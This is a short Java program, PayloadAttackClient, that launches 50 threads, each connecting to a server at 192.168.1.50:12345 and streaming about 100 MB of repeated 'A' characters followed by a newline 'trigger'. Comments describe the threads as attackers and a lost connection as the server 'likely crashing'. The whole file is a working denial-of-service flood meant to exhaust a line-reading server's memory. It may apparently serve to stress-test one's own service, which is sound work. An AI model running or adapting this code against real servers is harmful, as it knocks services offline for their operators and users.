import java.io.*;
import java.net.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class PayloadAttackClient {
    private static final String SERVER_ADDRESS = "192.168.1.50";
    private static final int SERVER_PORT = 12345;
    private static final int THREAD_COUNT = 50; // Number of simultaneous attackers
    private static final int PAYLOAD_MB_PER_THREAD = 100; // Total MB each thread sends

    public static void main(String[] args) {
        ExecutorService executor = Executors.newFixedThreadPool(THREAD_COUNT);

        System.out.println("Launching " + THREAD_COUNT + " attack threads...");

        for (int i = 0; i < THREAD_COUNT; i++) {
            final int threadId = i;
            executor.submit(() -> {
                try (Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
                     OutputStream out = socket.getOutputStream();
                     PrintWriter writer = new PrintWriter(out, false)) {

                    System.out.println("Thread-" + threadId + " connected.");
                    
                    // Pre-generate chunk to save client CPU
                    String chunk = "A".repeat(1_000_000); 

                    for (int j = 1; j <= PAYLOAD_MB_PER_THREAD; j++) {
                        writer.print(chunk);
                        if (j % 10 == 0) {
                            writer.flush();
                        }
                    }

                    // Send the trigger
                    writer.println();
                    writer.flush();
                    System.out.println("Thread-" + threadId + " finished payload.");

                } catch (IOException e) {
                    System.err.println("Thread-" + threadId + " lost connection (Server likely crashing): " + e.getMessage());
                }
            });
        }
        executor.shutdown();
    }
}